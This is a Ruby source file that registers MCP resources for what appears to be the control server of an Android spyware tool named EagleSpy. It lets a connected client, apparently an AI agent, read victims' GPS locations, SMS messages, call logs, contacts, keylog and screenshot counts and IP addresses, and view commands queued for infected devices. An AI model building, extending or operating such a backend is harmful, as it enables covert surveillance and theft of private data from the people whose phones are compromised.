# frozen_string_literal: true

module Mcp
  module Resources
    class DeviceResources
      def initialize(server)
        @server = server
      end

      def register
        register_device_resource
        register_device_location_resource
        register_device_sms_resource
        register_device_calls_resource
        register_device_contacts_resource
        register_device_commands_resource
      end

      private

      def register_device_resource
        @server.register_resource(
          uri_template: 'eaglespy://device/{id}',
          name: 'Device Details',
          description: 'Detailed information about a specific device including status, data counts, and configuration.',
          scope: 'devices:read'
        ) do |params|
          device = Smartphone.find_by!(device_id: params[:id])
          installation = device.apk_installation

          {
            contents: [{
              uri: "eaglespy://device/#{params[:id]}",
              mimeType: 'application/json',
              text: {
                device_id: device.device_id,
                name: device.name,
                online: device.last_activity_at.present? && device.last_activity_at > 5.minutes.ago,
                last_activity: device.last_activity_at&.iso8601,
                battery_level: installation&.battery_level,
                ip_address: installation&.target_ip,
                install_status: installation&.status,
                counts: {
                  sms: device.sms_messages.count,
                  calls: device.call_logs.count,
                  contacts: device.contacts.count,
                  photos: device.pictures.count,
                  locations: device.geo_locations.count,
                  keylogs: device.keylogs_count,
                  commands: device.commands_count,
                  recordings: device.recordings.count,
                  screenshots: device.screenshots.count
                }
              }.to_json
            }]
          }
        rescue ActiveRecord::RecordNotFound
          raise McpServer::ResourceNotFoundError, "Device not found: #{params[:id]}"
        end
      end

      def register_device_location_resource
        @server.register_resource(
          uri_template: 'eaglespy://device/{id}/location',
          name: 'Device Location',
          description: 'Current and recent GPS locations for a device.',
          scope: 'data:read'
        ) do |params|
          device = Smartphone.find_by!(device_id: params[:id])
          locations = device.geo_locations.order(created_at: :desc).limit(50)

          {
            contents: [{
              uri: "eaglespy://device/#{params[:id]}/location",
              mimeType: 'application/json',
              text: {
                device_id: device.device_id,
                current: locations.first&.then { |l|
                  { latitude: l.latitude, longitude: l.longitude, recorded_at: l.created_at.iso8601 }
                },
                recent: locations.map { |l|
                  { latitude: l.latitude, longitude: l.longitude, recorded_at: l.created_at.iso8601 }
                }
              }.to_json
            }]
          }
        rescue ActiveRecord::RecordNotFound
          raise McpServer::ResourceNotFoundError, "Device not found: #{params[:id]}"
        end
      end

      def register_device_sms_resource
        @server.register_resource(
          uri_template: 'eaglespy://device/{id}/sms',
          name: 'Device SMS Messages',
          description: 'SMS messages collected from a device.',
          scope: 'data:read'
        ) do |params|
          device = Smartphone.find_by!(device_id: params[:id])
          messages = device.sms_messages.order(created_at: :desc).limit(50)

          {
            contents: [{
              uri: "eaglespy://device/#{params[:id]}/sms",
              mimeType: 'application/json',
              text: {
                device_id: device.device_id,
                messages: messages.map { |m|
                  { id: m.id, filename: m.filename, created_at: m.created_at.iso8601 }
                },
                total: device.sms_messages.count
              }.to_json
            }]
          }
        rescue ActiveRecord::RecordNotFound
          raise McpServer::ResourceNotFoundError, "Device not found: #{params[:id]}"
        end
      end

      def register_device_calls_resource
        @server.register_resource(
          uri_template: 'eaglespy://device/{id}/calls',
          name: 'Device Call Logs',
          description: 'Call log entries collected from a device.',
          scope: 'data:read'
        ) do |params|
          device = Smartphone.find_by!(device_id: params[:id])
          logs = device.call_logs.order(created_at: :desc).limit(50)

          {
            contents: [{
              uri: "eaglespy://device/#{params[:id]}/calls",
              mimeType: 'application/json',
              text: {
                device_id: device.device_id,
                call_logs: logs.map { |c|
                  { id: c.id, filename: c.filename, date: c.date, created_at: c.created_at.iso8601 }
                },
                total: device.call_logs.count
              }.to_json
            }]
          }
        rescue ActiveRecord::RecordNotFound
          raise McpServer::ResourceNotFoundError, "Device not found: #{params[:id]}"
        end
      end

      def register_device_contacts_resource
        @server.register_resource(
          uri_template: 'eaglespy://device/{id}/contacts',
          name: 'Device Contacts',
          description: 'Contacts dumped from a device.',
          scope: 'data:read'
        ) do |params|
          device = Smartphone.find_by!(device_id: params[:id])
          contacts = device.contacts.order(created_at: :desc).limit(50)

          {
            contents: [{
              uri: "eaglespy://device/#{params[:id]}/contacts",
              mimeType: 'application/json',
              text: {
                device_id: device.device_id,
                contacts: contacts.map { |c|
                  { id: c.id, filename: c.filename, created_at: c.created_at.iso8601 }
                },
                total: device.contacts.count
              }.to_json
            }]
          }
        rescue ActiveRecord::RecordNotFound
          raise McpServer::ResourceNotFoundError, "Device not found: #{params[:id]}"
        end
      end

      def register_device_commands_resource
        @server.register_resource(
          uri_template: 'eaglespy://device/{id}/commands',
          name: 'Device Commands',
          description: 'Command history and pending commands for a device.',
          scope: 'commands:execute'
        ) do |params|
          device = Smartphone.find_by!(device_id: params[:id])
          commands = device.pending_commands.order(created_at: :desc).limit(50)

          {
            contents: [{
              uri: "eaglespy://device/#{params[:id]}/commands",
              mimeType: 'application/json',
              text: {
                device_id: device.device_id,
                pending: device.pending_commands.active.count,
                commands: commands.map { |c|
                  {
                    request_id: c.request_id,
                    command: c.command,
                    status: c.status,
                    created_at: c.created_at.iso8601,
                    completed_at: c.completed_at&.iso8601
                  }
                },
                total: device.pending_commands.count
              }.to_json
            }]
          }
        rescue ActiveRecord::RecordNotFound
          raise McpServer::ResourceNotFoundError, "Device not found: #{params[:id]}"
        end
      end
    end
  end
end
